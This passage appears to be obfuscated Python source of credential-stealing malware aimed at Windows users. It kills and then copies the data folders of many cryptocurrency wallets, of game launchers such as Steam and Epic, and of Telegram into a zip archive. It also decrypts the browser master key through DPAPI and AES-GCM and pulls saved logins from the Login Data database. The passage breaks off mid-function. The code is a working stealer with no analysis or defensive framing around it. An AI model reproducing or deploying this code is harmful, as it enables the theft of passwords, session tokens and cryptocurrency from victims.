    EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS         = [] if "Wallets" in CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS else None
    KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX  = [] if "Game Launchers" in CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS else None
    UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI            = [] if "Apps" in CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS else None

    OGNXURTGUHRBRMSKAMSSLFBRNLPGJKGBADUYSIFATCMSYPXWUDUXKCCXZJFIEAJMVYXUGNFEHGSUWWCOD = [
        ("Zcash",             os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
        ("Zerion",            os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(TELGVCRJTCIFRJXEWQXBHJSMLOKJYTGCIRJIJCWBUOJIFXMQYMZJBOVSHFQXQCVXMXVUSMEWNXQZEVQXHYCV, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_proc_name, v4r_type in OGNXURTGUHRBRMSKAMSSLFBRNLPGJKGBADUYSIFATCMSYPXWUDUXKCCXZJFIEAJMVYXUGNFEHGSUWWCOD:
            if v4r_type in CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_proc_name, v4r_type in OGNXURTGUHRBRMSKAMSSLFBRNLPGJKGBADUYSIFATCMSYPXWUDUXKCCXZJFIEAJMVYXUGNFEHGSUWWCOD:
        if v4r_type in CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS and os.path.exists(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
            try:
                if v4r_type == "Wallets" and EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS is not None:
                    EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS.append(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN)
                elif v4r_type == "Game Launchers" and KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX is not None:
                    KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX.append(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN)
                elif v4r_type == "Apps" and UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI is not None:
                    UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI.append(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN)

                SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(os.path.join("Session Files", KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, "path.txt"), GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT)

                if os.path.isdir(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
                    for v4r_root, _, v4r_files in os.walk(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
                        for v4r_file in v4r_files:
                            YZYUTYSOUKJQRIIQRLSJMEZNWEIITZXYSPVHSHTMYARJRWOLOPPYFVFLUWCCQYLCIEQNIZBNLLDTVUGANGJU = os.path.join(v4r_root, v4r_file)
                            VBOSXDUZHIRGKBEJYTONNUBRTWSCGESPLPNIGDTMDXMGCVZCFADIIXZTOQDZZBANQGUGODLJPKJEMBJYMS = os.path.join(
                                "Session Files", KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, "Files",
                                os.path.relpath(YZYUTYSOUKJQRIIQRLSJMEZNWEIITZXYSPVHSHTMYARJRWOLOPPYFVFLUWCCQYLCIEQNIZBNLLDTVUGANGJU, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT)
                            )
                            try:
                                SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.write(YZYUTYSOUKJQRIIQRLSJMEZNWEIITZXYSPVHSHTMYARJRWOLOPPYFVFLUWCCQYLCIEQNIZBNLLDTVUGANGJU, VBOSXDUZHIRGKBEJYTONNUBRTWSCGESPLPNIGDTMDXMGCVZCFADIIXZTOQDZZBANQGUGODLJPKJEMBJYMS)
                            except:
                                pass
                else:
                    VBOSXDUZHIRGKBEJYTONNUBRTWSCGESPLPNIGDTMDXMGCVZCFADIIXZTOQDZZBANQGUGODLJPKJEMBJYMS = os.path.join("Session Files", KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, "Files", os.path.basename(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT))
                    try:
                        SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.write(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, VBOSXDUZHIRGKBEJYTONNUBRTWSCGESPLPNIGDTMDXMGCVZCFADIIXZTOQDZZBANQGUGODLJPKJEMBJYMS)
                    except:
                        pass
            except:
                pass

    if "Wallets" in CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS:
        EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS = ", ".join(EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS) if EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS else "No"
    if "Game Launchers" in CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS:
        KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX = ", ".join(KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX) if KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX else "No"
    if "Apps" in CIGCNNUWVWGWVXDAMZWEVKDURZSIMZYSJUPKZMHEMKQZCPLYNDFGYMKLYDQWGMWTITPGOQQQCGJS:
        UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI = ", ".join(UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI) if UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI else "No"

    return EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS, KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX, UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI

def ZFICPVEAEGRKGKYQANZHBGHXZEBBOADZOEOXCVKOSJCRAEIYSKMSHX(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM, OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX, ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH, NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ, BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA, CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE

    BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
    HBQWDCBJAJGJKXWKFVSIGYJPIKGLTIJRXEBGQUDREUQHRZQQYOHOKYKGDEXNVAOWNFRYHACKLWAWTSHAXJCVI = []

    if "extentions" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM = 0
    else:
        FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM = None

    if "passwords" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        DVADARITRESRSAFEZWTBZMTDUMQPYHBSMZTWMKJFYESYSQMOYAPMJDUPLBLPGDARMNKIDX = []
        OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX = 0
    else:
        DVADARITRESRSAFEZWTBZMTDUMQPYHBSMZTWMKJFYESYSQMOYAPMJDUPLBLPGDARMNKIDX = ""
        OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX = None
    if "cookies" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        RWIIRTTVDRVQTMOWWALHGGZQJGCBWQPHMYQNBHSFQYOHEOKICGAREQRBYDQN = []
        ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH = 0
    else:
        RWIIRTTVDRVQTMOWWALHGGZQJGCBWQPHMYQNBHSFQYOHEOKICGAREQRBYDQN = ""
        ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH = None
    if "history" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        OCKKXFBVEKTEHMMTEZCOOMRCZJUCHQJBLFUKAYKOLGMQGWUVBFIZYSOTNFGXWLMUSYECYNLSM = []
        NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ = 0
    else:
        OCKKXFBVEKTEHMMTEZCOOMRCZJUCHQJBLFUKAYKOLGMQGWUVBFIZYSOTNFGXWLMUSYECYNLSM = ""
        NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ = None
    if "downloads" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        HSBCVEGPPCYGWMTVVMAFDRLGMCYRNMEODSODLNERJMYCEMNPIUEXSYWXATA = []
        BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA = 0
    else:
        HSBCVEGPPCYGWMTVVMAFDRLGMCYRNMEODSODLNERJMYCEMNPIUEXSYWXATA = ""
        BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA = None
    if "cards" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        HZGVWZFFSBDTAPBNOYKTDOHQALCSPMYEREAJBMCZMRSVANMGITAVEKTKGAVQWTALMJEXSGRCKSPVGDGWGOLILEWS = []
        CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE = 0
    else:
        HZGVWZFFSBDTAPBNOYKTDOHQALCSPMYEREAJBMCZMRSVANMGITAVEKTKGAVQWTALMJEXSGRCKSPVGDGWGOLILEWS = ""
        CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE = None
    
    def IBCBBJGNOHAQGCRXHSJANIUCGBFORXMVWCWAXDUPDDBZHHHEWYZAKZBDLSBAWVKJTVUUPKWKGRBBJOATPDJUMALUOCJXQN(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
        if not os.path.exists(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
            return None

        try:
            with open(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, 'r', encoding='utf-8') as v4r_f:
                BLEVMLAZASAMAIECAXHVHSQMPYLBSTHKUVHEZWUWVCXUHFJBFPOTGWTXKQOBVLCSCYHCATIBWC = json.load(v4r_f)

            VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC_key = base64.b64decode(BLEVMLAZASAMAIECAXHVHSQMPYLBSTHKUVHEZWUWVCXUHFJBFPOTGWTXKQOBVLCSCYHCATIBWC["os_crypt"]["encrypted_key"])[5:]
            HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP = win32crypt.CryptUnprotectData(VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC_key, None, None, None, 0)[1]
            return HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP
        except:
            return None

    def QKTXEAWGAXPPTBAWOOZDPBFTUIEPUNYOSDAGDRMRSGZJEIOJKLBWFIVKRUDRDIMUDGXKDIPNDYPBXPFQBB(LKSQMGLLTEDBUSNCQOBMXLWPWVEBAGBNGOSTEQEKEGFAVZJONX, HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP):
        try:
            MTMTNXLEJTSAEYTGUMLPNTXISSYEHIQZXWIONKLZFVUGLUDUEN = LKSQMGLLTEDBUSNCQOBMXLWPWVEBAGBNGOSTEQEKEGFAVZJONX[3:15]
            XQDCNKZRDXFOPQDOHWYGZXWKSIETGAWBDCYNVXXBDMTCQPAIZHRULQGPRBQJVJCRGZHHXNAEUMVLWAGAJWSYESKEO = LKSQMGLLTEDBUSNCQOBMXLWPWVEBAGBNGOSTEQEKEGFAVZJONX[15:-16]
            JTGAAGLJHIPUUNFRNAONETGYZAWMVLEOIYFOPYSSMTUQVJCDVRQDHCFIYTJWQUPFIQDTVDDEFWUHBDVLPWUVKPQPNYQ = LKSQMGLLTEDBUSNCQOBMXLWPWVEBAGBNGOSTEQEKEGFAVZJONX[-16:]
            KRAUAOEMMBIZCLYJADWOUXVJGGLAUVYJIGFRYWWWXSMSXYAXTAJCTSFJSDAJDPO = Cipher(algorithms.AES(HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP), modes.GCM(MTMTNXLEJTSAEYTGUMLPNTXISSYEHIQZXWIONKLZFVUGLUDUEN, JTGAAGLJHIPUUNFRNAONETGYZAWMVLEOIYFOPYSSMTUQVJCDVRQDHCFIYTJWQUPFIQDTVDDEFWUHBDVLPWUVKPQPNYQ))
            VIORQMHOYQHBKFUALNWPKMVJWZDLKSCRKXBNFUTAGWPISFQQHCQTXWTJENLSYALAZSPXTM = KRAUAOEMMBIZCLYJADWOUXVJGGLAUVYJIGFRYWWWXSMSXYAXTAJCTSFJSDAJDPO.decryptor()
            MMNSVJXIOZQTVLCHORXSJNRGYVBMMNCOVABNUUSLPTXKIVZTJRIGJHNERUDBHQJYOBFPPECTSEQGRGVOWII = VIORQMHOYQHBKFUALNWPKMVJWZDLKSCRKXBNFUTAGWPISFQQHCQTXWTJENLSYALAZSPXTM.update(XQDCNKZRDXFOPQDOHWYGZXWKSIETGAWBDCYNVXXBDMTCQPAIZHRULQGPRBQJVJCRGZHHXNAEUMVLWAGAJWSYESKEO) + VIORQMHOYQHBKFUALNWPKMVJWZDLKSCRKXBNFUTAGWPISFQQHCQTXWTJENLSYALAZSPXTM.finalize()
            return MMNSVJXIOZQTVLCHORXSJNRGYVBMMNCOVABNUUSLPTXKIVZTJRIGJHNERUDBHQJYOBFPPECTSEQGRGVOWII.decode()
        except:
            return None
        
    def GLOEYBVICHDNXAGGVSYVEXTFMEGDKKZTHQFTSRTUJXPBATEJOYVBGOIBMGAOOLGSACCTVUKRALSUDIVWYUZJRHDBKRHF(DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP):
        global OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX
        ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM_db = os.path.join(RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, 'Login Data')
        if not os.path.exists(ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM_db):
            return

        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB = sqlite3.connect(":memory:")
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ = sqlite3.connect(ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM_db)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.backup(MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.close()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC = MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.cursor()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            ABQNEMBXOJQBDMCJJPCJLPGKMDNKMHUNWVGQIHIFCINEQOOHEKOGKPTRIGPWAWCGHTPJJTYOXYJBJPKLP =          f"- Url      : {v4r_row[0]}"
            FXQSQMHNRJKEYZSRNTGJPIVIOOMUYXRNRFOCIDVMUNSWIRNVAYMU =     f"  Username : {v4r_row[1]}"
            ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM =     f"  Password : {QKTXEAWGAXPPTBAWOOZDPBFTUIEPUNYOSDAGDRMRSGZJEIOJKLBWFIVKRUDRDIMUDGXKDIPNDYPBXPFQBB(v4r_row[2], HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP)}"
            DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name = f"  Browser  : {DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP}"
